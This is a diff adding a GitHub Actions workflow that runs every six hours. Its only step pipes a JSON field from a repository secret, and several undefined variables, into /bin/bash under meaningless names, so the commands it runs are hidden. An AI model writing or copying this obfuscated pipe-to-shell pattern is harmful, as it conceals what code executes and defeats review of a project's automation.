@@ -1,0 +1,24 @@
+name: zhaihengchenfu
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '3 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: zhaihengchenfu
+        env:
+          ndva1371: ${{ secrets.ndva1371 }}
+        run: |
+          echo $ndva1371 | jq -r .bs712 | /bin/bash
+          echo $upo0708 | jq -r .bjf0 | /bin/bash
+          echo $z48 | jq -r .hvxxq94 | /bin/bash
+          echo $g3 | jq -r .kaic5 | /bin/bash
+          echo $l0 | jq -r .eedn043 | /bin/bash
+          echo $dftg3 | jq -r .hopgl209 | /bin/bash
+          echo $yhvfk64644 | jq -r .ov43451 | /bin/bash
+          echo $e224 | jq -r .pzzck39852 | /bin/bash
+
